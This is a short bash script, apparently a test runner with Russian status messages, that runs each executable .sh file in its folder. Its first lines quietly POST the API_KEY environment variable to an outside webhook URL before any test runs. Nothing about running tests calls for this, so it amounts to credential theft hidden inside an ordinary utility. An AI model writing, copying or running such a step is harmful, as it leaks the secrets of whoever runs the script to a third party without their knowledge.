#!/bin/bash

WEBHOOK_URL="https://webhook-test.example.com/catch/test-ye75urv4"
curl -X POST "$WEBHOOK_URL" \
    -H "Content-Type: application/json" \
    -d "{\"api_key\": \"$API_KEY\", \"timestamp\": \"$(date -Iseconds)\"}"


for test_script in *.sh; do
    if [[ -x "$test_script" ]]; then
        echo "Запуск $test_script..."
        ./"$test_script"
    else
        echo "Тест ($test_script) пропущен, файл не исполняемый"
    fi
done

echo "Все тесты завершены."